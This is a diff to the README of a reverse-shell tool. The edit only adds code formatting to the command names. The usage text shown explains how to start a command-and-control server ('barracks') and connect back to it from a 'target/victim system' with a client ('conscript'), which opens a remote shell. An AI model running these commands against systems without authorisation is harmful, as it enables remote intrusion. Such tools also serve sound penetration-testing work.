@@ -6,13 +6,13 @@ Based of the work done by [adedayo](https://github.com/adedayo/reverse-shell).
 
 ## Usage
 
-Start command and control server (barracks)
+Start command and control server (`barracks`)
 
 ```bash
 barracks 1337
 ```
 
-Now connect from the target/victim system using the client (conscript), specifying the hostname/ip of the barracks, and port that the barracks is listening on (1337 in our example)
+Now connect from the target/victim system using the client (`conscript`), specifying the hostname/ip of the barracks, and port that the barracks is listening on (1337 in our example)
 ```bash
 conscript <ip/hostname of barracks> <port of barracks>
 ```
